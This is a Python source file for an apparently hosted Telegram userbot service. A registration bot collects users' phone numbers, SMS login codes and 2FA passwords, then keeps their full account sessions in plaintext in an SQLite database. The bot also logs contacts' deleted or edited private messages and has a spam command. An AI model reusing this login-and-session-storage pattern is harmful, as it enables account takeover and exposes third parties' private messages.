import asyncio
import sqlite3
import os
from datetime import datetime
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events
from telethon.tl.types import PeerUser
from telethon.sessions import StringSession
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
import nest_asyncio
import logging

logging.basicConfig(level=logging.INFO)
nest_asyncio.apply()

# ========== КОНФИГ ==========
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]

print(f"🔧 Конфиг загружен")

# ========== БД ==========
conn = sqlite3.connect('userbot.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY, msg_id INTEGER, user_id INTEGER, chat_id INTEGER, text TEXT, date TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER PRIMARY KEY, muted_by INTEGER)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT)''')
conn.commit()

active_clients = {}

# ========== БОТ ДЛЯ РЕГИСТРАЦИИ ==========
reg_bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(reg_bot)

temp_auth = {}

def get_code_keyboard():
    kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
    buttons = []
    for i in range(1, 10):
        buttons.append(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"c_{i}"))
    kb.add(*buttons)
    kb.row(
        aiogram_types.InlineKeyboardButton("0", callback_data="c_0"),
        aiogram_types.InlineKeyboardButton("⌫", callback_data="c_del"),
        aiogram_types.InlineKeyboardButton("✅", callback_data="c_ok")
    )
    return kb

@dp.message_handler(commands=['start'])
async def start_auth(message: aiogram_types.Message):
    user_id = message.from_user.id
    
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
    row = cursor.fetchone()
    if row and row[0]:
        await message.answer("✅ Ты уже авторизован! Юзербот активен.")
        if user_id not in active_clients:
            asyncio.create_task(start_user_client(user_id, row[0]))
        return
    
    kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 Отправь свой номер телефона для входа", reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def get_phone(message: aiogram_types.Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_auth[user_id] = {
            "client": client,
            "phone": phone,
            "hash": result.phone_code_hash,
            "code": "",
        }
        
        await message.answer(
            "📱 Введи код из SMS (5 цифр):\n\nТекущий код: ` `",
            parse_mode="Markdown",
            reply_markup=get_code_keyboard()
        )
        
        await message.answer("Используй кнопки ниже:", reply_markup=aiogram_types.ReplyKeyboardRemove())
        
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('c_'))
async def code_callback(callback: aiogram_types.CallbackQuery):
    user_id = callback.from_user.id
    
    if user_id not in temp_auth:
        await callback.answer("❌ Сессия истекла, начни заново /start")
        await callback.message.delete()
        return
    
    data = callback.data
    action = data[2:]
    current_code = temp_auth[user_id]["code"]
    
    if action == "del":
        new_code = current_code[:-1]
        temp_auth[user_id]["code"] = new_code
        await callback.answer("Удалено")
        
    elif action == "ok":
        if len(current_code) == 5:
            await callback.answer("Авторизация...")
            await complete_auth(callback, user_id)
            return
        else:
            await callback.answer(f"Нужно 5 цифр (сейчас {len(current_code)})", show_alert=True)
            return
    else:
        if len(current_code) < 5:
            new_code = current_code + action
            temp_auth[user_id]["code"] = new_code
            await callback.answer(f"Добавлено {action}")
        else:
            await callback.answer("Уже 5 цифр, нажми ✅", show_alert=True)
            return
    
    new_code = temp_auth[user_id]["code"]
    code_display = new_code if new_code else " "
    text = f"📱 Введи код из SMS (5 цифр):\n\nТекущий код: `{code_display}`"
    
    try:
        await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=get_code_keyboard())
    except:
        pass
    
    await callback.answer()

async def complete_auth(callback, user_id: int):
    data = temp_auth[user_id]
    
    try:
        await data["client"].sign_in(
            phone=data["phone"],
            code=data["code"],
            phone_code_hash=data["hash"]
        )
        
        session_str = data["client"].session.save()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', 
                      (user_id, session_str))
        conn.commit()
        
        await callback.message.answer("✅ Авторизация успешна! Юзербот запущен.")
        
        asyncio.create_task(start_user_client(user_id, session_str))
        
        await data["client"].disconnect()
        del temp_auth[user_id]
        
    except Exception as e:
        error_msg = str(e)
        if "2FA" in error_msg or "password" in error_msg.lower():
            await callback.message.answer("🔐 Введи пароль от 2FA текстовым сообщением:")
            temp_auth[user_id]["step"] = "2fa"
        else:
            await callback.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in temp_auth and temp_auth[msg.from_user.id].get("step") == "2fa")
async def handle_2fa(message: aiogram_types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    data = temp_auth[user_id]
    
    try:
        await data["client"].sign_in(password=password)
        
        session_str = data["client"].session.save()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', 
                      (user_id, session_str))
        conn.commit()
        
        await message.answer("✅ Авторизация с 2FA успешна! Юзербот запущен.")
        
        asyncio.create_task(start_user_client(user_id, session_str))
        
        await data["client"].disconnect()
        del temp_auth[user_id]
        
    except Exception as e:
        await message.answer(f"❌ Ошибка 2FA: {e}")

# ========== ОСНОВНАЯ ЛОГИКА ЮЗЕРБОТА ==========

async def start_user_client(user_id: int, session_string: str):
    """Запускаем юзербота для пользователя"""
    
    if user_id in active_clients:
        try:
            await active_clients[user_id].disconnect()
        except:
            pass
    
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    
    if not await client.is_user_authorized():
        print(f"❌ {user_id} не авторизован")
        return
    
    active_clients[user_id] = client
    print(f"✅ Юзербот запущен для {user_id}")
    
    # Глобальные словари для хранения сообщений
    user_messages = {}
    
    # Загружаем мут-лист
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (user_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    @client.on(events.NewMessage(incoming=True))
    async def incoming_handler(event):
        if not isinstance(event.message.peer_id, PeerUser):
            return
        
        sender_id = event.sender_id
        msg_id = event.message.id
        text = event.message.text or ""
        
        # Проверка на мут
        if sender_id in muted_users:
            await event.delete()
            print(f"🗑 {user_id}: удалено сообщение от замьюченного {sender_id}")
            return
        
        # Сохраняем сообщение в словарь и БД
        if text:
            user_messages[msg_id] = {
                "user_id": sender_id,
                "text": text,
                "date": datetime.now().isoformat()
            }
            
            cursor.execute('INSERT OR REPLACE INTO messages (msg_id, user_id, chat_id, text, date) VALUES (?, ?, ?, ?, ?)',
                          (msg_id, sender_id, event.chat_id, text, datetime.now().isoformat()))
            conn.commit()
            print(f"💾 {user_id}: сохранено сообщение {msg_id} от {sender_id}")
    
    @client.on(events.MessageDeleted)
    async def deleted_handler(event):
        if not isinstance(event.chat, PeerUser):
            return
        
        for msg_id in event.deleted_ids:
            # Сначала ищем в словаре
            msg_data = user_messages.get(msg_id)
            
            # Если нет в словаре, ищем в БД
            if not msg_data:
                cursor.execute('SELECT user_id, text FROM messages WHERE msg_id=?', (msg_id,))
                row = cursor.fetchone()
                if row:
                    msg_data = {"user_id": row[0], "text": row[1]}
            
            if msg_data and msg_data["user_id"] != user_id:
                sender_id = msg_data["user_id"]
                old_text = msg_data["text"]
                
                try:
                    user = await client.get_entity(sender_id)
                    name = user.first_name or "Пользователь"
                    username = f" @{user.username}" if user.username else ""
                    
                    await client.send_message(
                        user_id,
                        f"🗑 <b>{name}</b>{username} удалил сообщение:\n\n<blockquote>{old_text[:500]}</blockquote>",
                        parse_mode='HTML'
                    )
                    print(f"📨 {user_id}: отправлено уведомление об удалении от {sender_id}")
                    
                except Exception as e:
                    print(f"Ошибка отправки удаления {user_id}: {e}")
                
                # Удаляем из БД
                cursor.execute('DELETE FROM messages WHERE msg_id=?', (msg_id,))
                conn.commit()
                
                # Удаляем из словаря
                if msg_id in user_messages:
                    del user_messages[msg_id]
    
    @client.on(events.MessageEdited)
    async def edited_handler(event):
        if not isinstance(event.message.peer_id, PeerUser) or event.out:
            return
        
        msg_id = event.id
        new_text = event.message.text or ""
        
        # Сначала ищем в словаре
        msg_data = user_messages.get(msg_id)
        
        # Если нет в словаре, ищем в БД
        if not msg_data:
            cursor.execute('SELECT user_id, text FROM messages WHERE msg_id=?', (msg_id,))
            row = cursor.fetchone()
            if row:
                msg_data = {"user_id": row[0], "text": row[1]}
        
        if msg_data and msg_data["user_id"] != user_id:
            sender_id = msg_data["user_id"]
            old_text = msg_data["text"]
            
            if old_text != new_text and old_text and new_text:
                try:
                    user = await client.get_entity(sender_id)
                    name = user.first_name or "Пользователь"
                    username = f" @{user.username}" if user.username else ""
                    
                    await client.send_message(
                        user_id,
                        f"✏️ <b>{name}</b>{username} изменил сообщение:\n\n"
                        f"<b>Было:</b>\n<blockquote>{old_text[:200]}</blockquote>\n"
                        f"<b>Стало:</b>\n<blockquote>{new_text[:200]}</blockquote>",
                        parse_mode='HTML'
                    )
                    print(f"📨 {user_id}: отправлено уведомление об изменении от {sender_id}")
                    
                except Exception as e:
                    print(f"Ошибка отправки изменения {user_id}: {e}")
                
                # Обновляем в БД
                cursor.execute('UPDATE messages SET text=? WHERE msg_id=?', (new_text, msg_id))
                conn.commit()
                
                # Обновляем в словаре
                user_messages[msg_id] = {
                    "user_id": sender_id,
                    "text": new_text,
                    "date": datetime.now().isoformat()
                }
    
    @client.on(events.NewMessage(outgoing=True))
    async def command_handler(event):
        if not isinstance(event.message.peer_id, PeerUser):
            return
        
        text = event.message.text or ""
        
        if not text.startswith('.'):
            return
        
        print(f"📨 Команда от {user_id}: {text}")
        
        if text == '.help':
            help_text = """<b>📝 Команды юзербота (только ЛС)</b>

<blockquote>
▫️ <b>.help</b> - эта справка
▫️ <b>.mute</b> (ответ на сообщение) - заглушить
▫️ <b>.unmute</b> (ответ на сообщение) - разглушить
▫️ <b>.list</b> - список замьюченных
▫️ <b>.info</b> (ответ на сообщение) - инфо о пользователе
▫️ <b>.type [текст]</b> - эффект печати
▫️ <b>.spam [кол-во] [текст]</b> - спам (макс 20)
</blockquote>"""
            await event.edit(help_text, parse_mode='HTML')
            return
        
        if text == '.mute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id and reply.sender_id != user_id:
                target_id = reply.sender_id
                cursor.execute('INSERT OR IGNORE INTO muted_users (user_id, muted_by) VALUES (?, ?)', (target_id, user_id))
                conn.commit()
                muted_users.add(target_id)
                try:
                    user = await client.get_entity(target_id)
                    await event.edit(f'🔕 {user.first_name} заглушен')
                except:
                    await event.edit(f'🔕 Пользователь заглушен')
            else:
                await event.edit('❌ Ответь на сообщение пользователя')
            return
        
        if text == '.unmute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                target_id = reply.sender_id
                cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (target_id, user_id))
                conn.commit()
                muted_users.discard(target_id)
                try:
                    user = await client.get_entity(target_id)
                    await event.edit(f'🔔 {user.first_name} разглушен')
                except:
                    await event.edit(f'🔔 Пользователь разглушен')
            else:
                await event.edit('❌ Ответь на сообщение пользователя')
            return
        
        if text == '.list':
            cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (user_id,))
            my_muted = cursor.fetchall()
            if my_muted:
                names = []
                for (uid,) in my_muted[:20]:
                    try:
                        user = await client.get_entity(uid)
                        names.append(f"• {user.first_name} ({uid})")
                    except:
                        names.append(f"• {uid}")
                await event.edit(f"🔕 <b>Твои замьюченные:</b>\n\n" + "\n".join(names), parse_mode='HTML')
            else:
                await event.edit("🔕 У тебя нет замьюченных")
            return
        
        if text == '.info':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                target_id = reply.sender_id
                try:
                    user = await client.get_entity(target_id)
                    name = f"{user.first_name or ''} {user.last_name or ''}".strip()
                    username = f"@{user.username}" if user.username else "нет"
                    
                    cursor.execute('SELECT user_id FROM muted_users WHERE user_id=? AND muted_by=?', (target_id, user_id))
                    is_muted = "✅ Да" if cursor.fetchone() else "❌ Нет"
                    
                    info = f"""<b>👤 Инфо</b>

<b>ID:</b> <code>{target_id}</code>
<b>Имя:</b> {name}
<b>Username:</b> {username}
<b>Заглушен тобой:</b> {is_muted}"""
                    
                    await event.edit(info, parse_mode='HTML')
                except Exception as e:
                    await event.edit(f"❌ Ошибка: {e}")
            else:
                await event.edit('❌ Ответь на сообщение')
            return
        
        if text.startswith('.type '):
            typing_text = text[6:]
            if typing_text:
                await event.edit(".")
                typed = ""
                for char in typing_text:
                    typed += char
                    try:
                        await event.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.3)
            return
        
        if text.startswith('.spam '):
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                try:
                    count = min(int(parts[1]), 20)
                    msg_text = parts[2] if len(parts) > 2 else None
                    
                    if not msg_text:
                        reply = await event.get_reply_message()
                        if reply:
                            msg_text = reply.text
                    
                    if msg_text:
                        await event.delete()
                        for i in range(count):
                            await client.send_message(event.chat_id, msg_text)
                            await asyncio.sleep(0.3)
                except:
                    pass
            return
    
    await client.run_until_disconnected()

# ========== ВЕБ-СЕРВЕР ==========
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return "OK"

def run_web():
    flask_app.run(host='0.0.0.0', port=8080)

async def restore_all_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    rows = cursor.fetchall()
    for user_id, session_str in rows:
        asyncio.create_task(start_user_client(user_id, session_str))

async def main():
    print("🚀 Запуск...")
    await restore_all_sessions()
    while True:
        await asyncio.sleep(10)

def start_aiogram():
    from aiogram.utils import executor
    executor.start_polling(dp, skip_updates=True)

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    Thread(target=start_aiogram, daemon=True).start()
    asyncio.run(main())
